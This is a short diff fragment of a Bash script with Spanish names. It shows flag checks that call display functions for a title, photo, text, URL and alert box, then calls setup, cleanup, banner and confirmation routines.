+NOCLONOLAPAGINAASIQUENOAGREGONADA="XD"
+fi
+fi
+
+if [[ $show == "t" ]];then
+show_title
+fi
+if [[ $show0 == "i" ]];then
+show_photo
+fi
+if [[ $show1 == "d" ]];then
+show_text
+fi
+if [[ $show2 == "u" ]];then
+show_url
+fi
+if [[ $show3 == "a" ]];then
+add_alert_box
+fi
+}
+
+archivos
+eliminar
+banner
+confirmar
+echo -e "\e[0m"
